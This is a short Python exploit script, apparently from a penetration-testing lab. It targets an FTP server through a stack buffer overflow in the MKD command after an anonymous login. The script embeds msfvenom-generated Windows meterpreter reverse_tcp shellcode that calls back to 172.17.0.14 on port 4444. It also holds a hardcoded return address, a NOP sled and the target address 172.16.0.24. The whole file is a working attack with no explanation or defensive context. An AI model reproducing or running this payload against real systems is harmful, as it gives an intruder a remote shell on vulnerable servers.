import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.17.0.14 -b "\x00\x0a\x0d" -f python
buf =  b""
buf += b"\xda\xd3\xd9\x74\x24\xf4\x5e\x33\xc9\xba\xa4\xef\xbb"
buf += b"\xc8\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x62\xeb\x59"
buf += b"\x3d\x96\x1c\x1f\xbe\x66\xdd\x40\x36\x83\xec\x40\x2c"
buf += b"\xc0\x5f\x71\x26\x84\x53\xfa\x6a\x3c\xe7\x8e\xa2\x33"
buf += b"\x40\x24\x95\x7a\x51\x15\xe5\x1d\xd1\x64\x3a\xfd\xe8"
buf += b"\xa6\x4f\xfc\x2d\xda\xa2\xac\xe6\x90\x11\x40\x82\xed"
buf += b"\xa9\xeb\xd8\xe0\xa9\x08\xa8\x03\x9b\x9f\xa2\x5d\x3b"
buf += b"\x1e\x66\xd6\x72\x38\x6b\xd3\xcd\xb3\x5f\xaf\xcf\x15"
buf += b"\xae\x50\x63\x58\x1e\xa3\x7d\x9d\x99\x5c\x08\xd7\xd9"
buf += b"\xe1\x0b\x2c\xa3\x3d\x99\xb6\x03\xb5\x39\x12\xb5\x1a"
buf += b"\xdf\xd1\xb9\xd7\xab\xbd\xdd\xe6\x78\xb6\xda\x63\x7f"
buf += b"\x18\x6b\x37\xa4\xbc\x37\xe3\xc5\xe5\x9d\x42\xf9\xf5"
buf += b"\x7d\x3a\x5f\x7e\x93\x2f\xd2\xdd\xfc\x9c\xdf\xdd\xfc"
buf += b"\x8a\x68\xae\xce\x15\xc3\x38\x63\xdd\xcd\xbf\x84\xf4"
buf += b"\xaa\x2f\x7b\xf7\xca\x66\xb8\xa3\x9a\x10\x69\xcc\x70"
buf += b"\xe0\x96\x19\xd6\xb0\x38\xf2\x97\x60\xf9\xa2\x7f\x6a"
buf += b"\xf6\x9d\x60\x95\xdc\xb5\x0b\x6c\xb7\x15\xdb\x6e\x49"
buf += b"\x0e\xde\x6e\x44\x92\x57\x88\x0c\x3a\x3e\x03\xb9\xa3"
buf += b"\x1b\xdf\x58\x2b\xb6\x9a\x5b\xa7\x35\x5b\x15\x40\x33"
buf += b"\x4f\xc2\xa0\x0e\x2d\x45\xbe\xa4\x59\x09\x2d\x23\x99"
buf += b"\x44\x4e\xfc\xce\x01\xa0\xf5\x9a\xbf\x9b\xaf\xb8\x3d"
buf += b"\x7d\x97\x78\x9a\xbe\x16\x81\x6f\xfa\x3c\x91\xa9\x03"
buf += b"\x79\xc5\x65\x52\xd7\xb3\xc3\x0c\x99\x6d\x9a\xe3\x73"
buf += b"\xf9\x5b\xc8\x43\x7f\x64\x05\x32\x9f\xd5\xf0\x03\xa0"
buf += b"\xda\x94\x83\xd9\x06\x05\x6b\x30\x83\x35\x26\x18\xa2"
buf += b"\xdd\xef\xc9\xf6\x83\x0f\x24\x34\xba\x93\xcc\xc5\x39"
buf += b"\x8b\xa5\xc0\x06\x0b\x56\xb9\x17\xfe\x58\x6e\x17\x2b"



# PUSH ESP 77715c65
#shell32.dll 54 C3
#buffer = "A"*247 + "B"*4 + "X"*255
buffer = "A"*247 + "\x65\x5c\x71\x77" + "\x90"*20 + buf 

s.connect(('172.16.0.24',21))
s.recv(1024)

s.send('USER anonymous\r\n')
s.recv(1024)

s.send('PASS anonymous\r\n')
s.recv(1024)

s.send('MKD ' +buffer+'\r\n')
s.recv(1024)

s.close()
